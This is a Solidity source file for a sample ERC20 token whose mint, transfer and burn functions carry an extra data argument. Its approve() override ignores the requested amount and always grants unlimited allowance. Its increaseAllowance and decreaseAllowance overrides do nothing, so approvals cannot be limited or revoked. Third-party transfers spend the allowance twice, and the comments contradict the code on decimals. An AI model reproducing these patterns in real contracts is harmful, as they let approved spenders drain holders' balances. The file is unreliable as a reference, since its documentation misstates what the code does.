// SPDX-License-Identifier: Apache-2.0
pragma abicoder v2;

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";
import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./IERC20WithData.sol";

/**
 * Example ERC20 token with mint, burn, and attached data support.
 *
 * This contract demonstrates a very simple ERC20 fungible token. Notes on functionality:
 *   - the contract owner (ie deployer) is the only party allowed to mint
 *   - any party can approve another party to manage (ie transfer) a certain amount of their
 *     tokens (approving for MAX_INT gives an unlimited approval)
 *   - any party can burn their own tokens
 *   - decimals hard-coded to 18 (so 1 token is expressed as 1000000000000000000)
 *
 * The inclusion of a "data" argument on each external method allows it to write
 * extra data to the chain alongside each token transaction, in order to correlate it with
 * other on- and off-chain events.
 *
 * This is a sample only and NOT a reference implementation.
 */
contract ERC20WithData is Context, Ownable, ERC165, ERC20, IERC20WithData {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function supportsInterface(
        bytes4 interfaceId
    ) public view virtual override(ERC165, IERC165) returns (bool) {
        return
            interfaceId == type(IERC20WithData).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    function mintWithData(
        address to,
        uint256 amount,
        string memory data
    ) external override onlyOwner {
        /*
        Add validation check to ensure amount is not something ridiculously high
        500000000000000000 with the current default of 6 decimal places allows
        for a maximum amount of 500 Billion. 
        */
        require(
            amount <= 500000000000000000,
            "ERC20: Mint amounts exceeds maximum of 500000000000000000"
        );
        _mint(to, amount);
    }

    function transferWithData(
        address from,
        address to,
        uint256 amount,
        string memory data
    ) external override {
        if (from == _msgSender()) {
            transfer(to, amount);
        } else {
            address spender = _msgSender();
            _spendAllowance(from, spender, amount);
            transferFrom(from, to, amount);
        }
    }

    function burnWithData(
        address from,
        uint256 amount,
        string memory data
    ) external override {
        require(from == _msgSender(), "ERC20WithData: caller is not owner");
        _burn(from, amount);
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, type(uint256).max);
        emit Approval(owner, spender, type(uint256).max);
        return true;
    }

    // Remove the functions and override it to do nothing
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual override returns (bool) {
        // Do nothing
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual override returns (bool) {
        // Do nothing
        return true;
    }
}
